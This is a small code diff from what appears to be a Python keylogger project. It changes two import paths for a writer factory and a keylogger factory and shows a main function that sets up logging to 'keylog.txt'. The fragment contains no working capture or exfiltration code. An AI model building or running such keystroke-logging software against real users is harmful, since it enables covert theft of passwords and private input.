@@ -1,5 +1,5 @@
-from utils.writer_factory import WriterFactory
-from utils.key_logger_factory import KeyLoggerFactory
+from factories.writer_factory import WriterFactory
+from factories.key_logger_factory import KeyLoggerFactory
 
 def main():
     writer = WriterFactory.create_writer("file", "keylog.txt")
